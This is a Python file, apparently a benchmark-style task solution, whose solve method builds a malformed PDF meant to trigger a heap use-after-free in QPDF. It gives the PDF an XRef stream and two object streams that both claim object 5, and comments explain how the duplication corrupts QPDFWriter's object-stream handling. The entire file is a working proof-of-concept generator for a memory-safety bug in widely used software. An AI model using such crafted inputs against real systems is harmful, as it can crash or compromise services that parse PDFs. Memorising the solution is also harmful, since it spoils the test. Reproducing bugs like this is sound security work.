import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability (Heap Use After Free in QPDF::getCompressibleObjSet) is triggered
        # when QPDFWriter::preserveObjectStreams processes a file where the same object ID
        # is claimed by multiple object streams.
        # This causes the object to be removed from the cache while still being referenced,
        # leading to a UAF.
        
        # We will construct a PDF 1.5 file with an XRef Stream.
        # It will define two Object Streams (Obj 4 and Obj 6).
        # Both Object Streams will claim to contain Object 5.
        # This duplication confuses the QPDFWriter optimization logic.
        
        def p32(i): return struct.pack('>I', i)
        
        objects = []
        
        # 1: Catalog
        # Reference Obj 4 (via Ref4) and Obj 8 (via Ref8) to ensure Stream 4 is processed/reachable.
        # Reference Obj 5 (via Ref5) to ensure it's considered used.
        obj1 = b"<< /Type /Catalog /Pages 2 0 R /Ref4 4 0 R /Ref5 5 0 R /Ref8 8 0 R >>"
        objects.append((1, obj1))
        
        # 2: Pages
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        objects.append((2, obj2))
        
        # 3: Page
        obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>"
        objects.append((3, obj3))
        
        # Object contents
        content_5 = b"(Shared)"
        content_8 = b"(Unique)"
        
        # Stream 4 (ObjStm): Claims to contain Obj 5 and Obj 8
        # Index format: "obj_num offset obj_num offset "
        # 5 at offset 0, 8 at offset 8 (len("(Shared)") is 8)
        idx_str_4 = b"5 0 8 8 "
        stm_4_full = idx_str_4 + content_5 + content_8
        obj4 = (b"<< /Type /ObjStm /N 2 /First " + str(len(idx_str_4)).encode() + 
                b" /Length " + str(len(stm_4_full)).encode() + b" >>\nstream\n" + 
                stm_4_full + b"\nendstream")
        objects.append((4, obj4))
        
        # Stream 6 (ObjStm): Claims to contain Obj 5
        # This creates the conflict for Object 5
        idx_str_6 = b"5 0 "
        stm_6_full = idx_str_6 + content_5
        obj6 = (b"<< /Type /ObjStm /N 1 /First " + str(len(idx_str_6)).encode() + 
                b" /Length " + str(len(stm_6_full)).encode() + b" >>\nstream\n" + 
                stm_6_full + b"\nendstream")
        objects.append((6, obj6))
        
        # Construct PDF body
        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        body = b""
        offsets = {}
        current_offset = len(header)
        
        # Output standard objects
        for oid, content in objects:
            offsets[oid] = current_offset
            obj_blob = f"{oid} 0 obj\n".encode() + content + b"\nendobj\n"
            body += obj_blob
            current_offset += len(obj_blob)
            
        # XRef Stream (Obj 7) construction
        # We use a Cross-Reference Stream because we are using Object Streams (Type 2 entries).
        # We need entries for objects 0..8
        xref_rows = []
        
        # 0: Free
        xref_rows.append(b'\x00\x00\x00\x00\x00\xff')
        
        # 1-4: Standard Type 1 (Offsets)
        for i in range(1, 5):
            xref_rows.append(b'\x01' + p32(offsets[i]) + b'\x00')
            
        # 5: Type 2, Stored in Stream 6, Index 0
        # The XRef says 5 is in Stream 6.
        # But Stream 4 also claims to have 5. This triggers the bug when Stream 4 is parsed.
        xref_rows.append(b'\x02' + p32(6) + b'\x00')
        
        # 6: Type 1
        xref_rows.append(b'\x01' + p32(offsets[6]) + b'\x00')
        
        # 7: Type 1 (Self) - we know its offset will be current_offset
        offset_7 = current_offset
        xref_rows.append(b'\x01' + p32(offset_7) + b'\x00')
        
        # 8: Type 2, Stored in Stream 4, Index 1
        xref_rows.append(b'\x02' + p32(4) + b'\x01')
        
        xref_content = b"".join(xref_rows)
        xref_compressed = zlib.compress(xref_content)
        
        obj7 = (b"7 0 obj\n<< /Type /XRef /Size 9 /Root 1 0 R /W [1 4 1] /Filter /FlateDecode /Length " + 
                str(len(xref_compressed)).encode() + b" >>\nstream\n" + 
                xref_compressed + b"\nendstream\nendobj\n")
        
        trailer = b"startxref\n" + str(offset_7).encode() + b"\n%%EOF"
        
        return header + body + obj7 + trailer